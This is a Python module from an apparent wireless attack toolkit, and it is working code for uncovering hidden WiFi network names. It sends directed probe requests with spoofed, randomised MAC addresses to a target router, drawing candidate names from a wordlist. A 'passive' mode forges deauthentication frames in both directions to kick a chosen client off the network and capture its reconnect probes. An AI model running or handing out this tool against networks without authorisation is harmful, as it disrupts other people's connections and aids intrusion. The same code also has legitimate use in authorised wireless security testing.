"""
ESSID Bruteforce - Hidden Network Discovery Tool

This module discovers hidden WiFi networks by sending directed 802.11 probe
requests to a target AP and listening for probe responses.
"""

import os
import time
import subprocess
from ui import (cprint, iprint, wprint, eprint, sprint, cinput,
                   RED, GREEN, CYAN, YELLOW, MAGENTA, WHITE,
                   RESET, LIGHT_CYAN, clear)


class ESSIDBruteforcer:
    """
    Discovers hidden WiFi networks by sending directed 802.11 probe requests
    to a target BSSID and capturing probe responses.
    """

    def __init__(self, interface):
        self.interface = interface
        self.found_ssids = []
        self._stop_event = False

    def verify_monitor_mode(self):
        try:
            result = subprocess.run(
                ["iwconfig", self.interface],
                capture_output=True,
                text=True,
                timeout=5
            )
            return "Monitor" in result.stdout
        except Exception as e:
            eprint(f"Error checking monitor mode: {e}")
            return False

    def get_wordlist_path(self):
        script_dir = os.path.dirname(os.path.abspath(__file__))
        wordlist_path = os.path.join(script_dir, "data", "common_ssids.txt")
        return wordlist_path if os.path.exists(wordlist_path) else None

    def _load_scapy(self):
        """Lazy-import scapy and return the needed symbols, or None on failure."""
        try:
            from scapy.all import RadioTap, Dot11, Dot11Elt, Dot11ProbeResp, sendp, sniff, RandMAC
            return RadioTap, Dot11, Dot11Elt, Dot11ProbeResp, sendp, sniff, RandMAC
        except ImportError:
            eprint("scapy not installed. Run: pip install scapy")
            return None

    def _build_probe(self, RadioTap, Dot11, Dot11Elt, RandMAC, bssid, ssid):
        """Build a directed 802.11 probe request frame."""
        return (
            RadioTap() /
            Dot11(
                type=0, subtype=4,          # management / probe request
                addr1=bssid,                # unicast destination: target AP
                addr2=str(RandMAC()),       # our (randomised) station MAC
                addr3=bssid                 # BSSID field
            ) /
            Dot11Elt(ID='SSID', info=ssid) /
            Dot11Elt(ID='Rates', info=b'\x82\x84\x8b\x96\x24\x30\x48\x6c')
        )

    def _set_channel(self, channel):
        """Lock the monitor interface to a specific channel."""
        try:
            result = subprocess.run(
                ["sudo", "iw", "dev", self.interface, "set", "channel", str(channel)],
                capture_output=True, text=True, timeout=5
            )
            if result.returncode == 0:
                iprint(f"Locked to channel {channel}")
                return True
            else:
                wprint(f"Could not set channel: {result.stderr.strip()}")
                return False
        except Exception as e:
            wprint(f"Could not set channel: {e}")
            return False

    def _run_probe_loop(self, bssid, ssids, scapy_symbols):
        """
        Core bruteforce logic shared by wordlist and custom modes.
        AsyncSniffer is started once before the probe loop so it is already
        capturing when the router's probe response arrives (typically <2ms after
        the probe request). Returns the discovered SSID string, or None.
        """
        RadioTap, Dot11, Dot11Elt, Dot11ProbeResp, sendp, sniff, RandMAC = scapy_symbols

        try:
            from scapy.all import AsyncSniffer
        except ImportError:
            eprint("AsyncSniffer not available. Upgrade scapy: pip install --upgrade scapy")
            return None

        bssid_lower = bssid.lower()
        total = len(ssids)
        self._stop_event = False

        def is_response(p):
            return (
                p.haslayer(Dot11) and
                p[Dot11].type == 0 and p[Dot11].subtype == 5 and
                p[Dot11].addr2 is not None and
                p[Dot11].addr2.lower() == bssid_lower
            )

        # Use a callback list — AsyncSniffer.results is only set after stop(),
        # so we collect responses via prn into our own list instead.
        captured = []

        def on_response(p):
            if is_response(p):
                captured.append(p)

        sniffer = AsyncSniffer(iface=self.interface, prn=on_response, store=False)
        sniffer.start()
        time.sleep(0.2)  # let the sniffer open its socket before first probe

        result = None
        for idx, ssid in enumerate(ssids, 1):
            if self._stop_event:
                break
            try:
                pkt = self._build_probe(RadioTap, Dot11, Dot11Elt, RandMAC, bssid, ssid)
                sendp(pkt, iface=self.interface, verbose=False)
                cprint(f"[{idx}/{total}] Probing: {ssid}", CYAN)
                time.sleep(0.3)

                if captured:
                    elt = captured[0].getlayer(Dot11Elt)
                    while elt:
                        if elt.ID == 0 and elt.info:
                            name = elt.info.decode('utf-8', errors='ignore').strip()
                            if name:
                                result = name
                                sprint(f"\nFound hidden SSID: {name}")
                            break
                        elt = elt.payload.getlayer(Dot11Elt) if elt.payload else None
                    if result:
                        break

            except KeyboardInterrupt:
                wprint("\nBruteforce stopped by user")
                break

        try:
            sniffer.stop()
        except Exception:
            pass

        return result

    def bruteforce_with_wordlist(self, bssid, wordlist_path):
        syms = self._load_scapy()
        if not syms:
            return

        if not os.path.exists(wordlist_path):
            eprint(f"Wordlist not found: {wordlist_path}")
            return

        with open(wordlist_path, 'r') as f:
            ssids = [line.strip() for line in f if line.strip()]

        iprint(f"Targeting router: {bssid}")
        iprint(f"Wordlist SSIDs: {len(ssids)}")
        iprint("Sending directed probe requests (Ctrl+C to stop)\n")
        time.sleep(1)

        result = self._run_probe_loop(bssid, ssids, syms)

        print()
        if result:
            sprint(f"Hidden SSID discovered: {result}")
        else:
            wprint("Hidden SSID not found in wordlist")

    def bruteforce_with_custom(self, bssid, ssid_list):
        syms = self._load_scapy()
        if not syms:
            return

        iprint(f"Targeting router: {bssid}")
        iprint(f"Testing {len(ssid_list)} SSIDs")
        iprint("Sending directed probe requests (Ctrl+C to stop)\n")
        time.sleep(1)

        result = self._run_probe_loop(bssid, ssid_list, syms)

        print()
        if result:
            sprint(f"Hidden SSID discovered: {result}")
        else:
            wprint("No hidden SSID found")

    def stop_bruteforce(self):
        self._stop_event = True

    def passive_discovery(self, bssid):
        """
        Discover hidden SSID by capturing probe requests sent by a connected
        client after being deauthed. The client's reconnect probes contain
        the hidden SSID in plaintext.
        """
        syms = self._load_scapy()
        if not syms:
            return
        RadioTap, Dot11, Dot11Elt, Dot11ProbeResp, sendp, sniff, RandMAC = syms

        try:
            from scapy.all import Dot11Deauth
        except ImportError:
            eprint("Could not import Dot11Deauth from scapy")
            return

        iprint("Passive Mode: capture hidden SSID from client probe requests")
        iprint("Find the client MAC in your scanner (option 3 in main menu)\n")

        client_mac = cinput("Client MAC to deauth (empty = sniff only)", LIGHT_CYAN)

        if client_mac:
            iprint(f"Sending deauth bursts to {client_mac}...")
            deauth_ap_to_client = (
                RadioTap() /
                Dot11(type=0, subtype=12,
                      addr1=client_mac,
                      addr2=bssid,
                      addr3=bssid) /
                Dot11Deauth(reason=7)
            )
            deauth_client_to_ap = (
                RadioTap() /
                Dot11(type=0, subtype=12,
                      addr1=bssid,
                      addr2=client_mac,
                      addr3=bssid) /
                Dot11Deauth(reason=7)
            )
            for _ in range(10):
                sendp(deauth_ap_to_client, iface=self.interface, verbose=False)
                sendp(deauth_client_to_ap, iface=self.interface, verbose=False)
                time.sleep(0.1)
            iprint("Deauth sent. Listening for client probe requests...\n")
        else:
            iprint("Listening for probe requests directed at target AP...\n")

        found = set()
        client_lower = client_mac.lower() if client_mac else None

        def on_packet(pkt):
            if not pkt.haslayer(Dot11):
                return
            frame = pkt[Dot11]
            # Probe request = type 0, subtype 4
            if not (frame.type == 0 and frame.subtype == 4):
                return
            src = frame.addr2
            if not src:
                return
            # Filter by client MAC if provided, otherwise any probe to our BSSID
            if client_lower:
                if src.lower() != client_lower:
                    return
            else:
                dst = frame.addr1
                if not dst or dst.lower() != bssid.lower():
                    return
            # Extract SSID (element ID 0)
            elt = pkt.getlayer(Dot11Elt)
            while elt:
                if elt.ID == 0 and elt.info:
                    ssid = elt.info.decode('utf-8', errors='ignore').strip()
                    if ssid and ssid not in found:
                        found.add(ssid)
                        sprint(f"Captured probe → SSID: {ssid}  (from {src})")
                    return
                elt = elt.payload.getlayer(Dot11Elt) if elt.payload else None

        iprint("Sniffing for 30 seconds (Ctrl+C to stop early)...")
        try:
            sniff(iface=self.interface, prn=on_packet, store=False, timeout=30)
        except KeyboardInterrupt:
            pass

        print()
        if found:
            sprint(f"Hidden SSID(s) discovered: {', '.join(found)}")
        else:
            wprint("No probe requests captured — try deauthing the client again")

    def display_mode_menu(self):
        print()
        cprint("╔════════════════════════════════════════════════════════╗", CYAN)
        cprint("║            SELECT BRUTEFORCE MODE                      ║", CYAN)
        cprint("╠════════════════════════════════════════════════════════╣", CYAN)
        cprint("║                                                        ║", CYAN)
        cprint("║  1) Wordlist Mode                                      ║", LIGHT_CYAN)
        cprint("║     Use common SSID list (recommended)                 ║", WHITE)
        cprint("║                                                        ║", CYAN)
        cprint("║  2) Custom SSIDs                                       ║", LIGHT_CYAN)
        cprint("║     Manually enter SSIDs to probe                      ║", WHITE)
        cprint("║                                                        ║", CYAN)
        cprint("║  3) Passive Mode                                       ║", LIGHT_CYAN)
        cprint("║     Deauth a client and capture its probe requests     ║", WHITE)
        cprint("║                                                        ║", CYAN)
        cprint("║  0) Cancel                                             ║", YELLOW)
        cprint("║                                                        ║", CYAN)
        cprint("╚════════════════════════════════════════════════════════╝", CYAN)

    def run_interactive(self):
        while True:
            clear()
            cprint("╔════════════════════════════════════════════════════════╗", MAGENTA)
            cprint("║               ESSID BRUTEFORCE ATTACK                  ║", MAGENTA)
            cprint("╚════════════════════════════════════════════════════════╝", MAGENTA)
            print()
            cprint(f"Interface: {self.interface}", LIGHT_CYAN)
            cprint(f"Monitor Mode: ", LIGHT_CYAN, end='')
            sprint("Verified" if self.verify_monitor_mode() else "Not detected")
            print()

            bssid = cinput("Enter target router MAC (BSSID)", LIGHT_CYAN)
            if not bssid:
                break

            channel = cinput("Enter router channel (e.g. 1, 6, 11)", LIGHT_CYAN)
            if channel.isdigit():
                self._set_channel(int(channel))
            else:
                wprint("Invalid channel, skipping channel lock (may affect results)")

            self.display_mode_menu()
            choice = cinput("Select mode", LIGHT_CYAN)

            if choice == "0":
                break
            elif choice == "1":
                wordlist_path = self.get_wordlist_path()
                if wordlist_path:
                    clear()
                    self.bruteforce_with_wordlist(bssid, wordlist_path)
                else:
                    eprint("Wordlist not found: common_ssids.txt")
            elif choice == "2":
                clear()
                cprint("Enter SSIDs to probe (one per line, empty line when done):", YELLOW)
                ssid_list = []
                while True:
                    ssid = cinput("SSID", LIGHT_CYAN)
                    if not ssid:
                        break
                    ssid_list.append(ssid)

                if ssid_list:
                    clear()
                    self.bruteforce_with_custom(bssid, ssid_list)
                else:
                    wprint("No SSIDs entered")
            elif choice == "3":
                clear()
                self.passive_discovery(bssid)
            else:
                wprint(f"Invalid option: {choice}")
                time.sleep(1)

            if choice in ["1", "2", "3"]:
                input(f"\n{CYAN}Press Enter to continue...{RESET}")
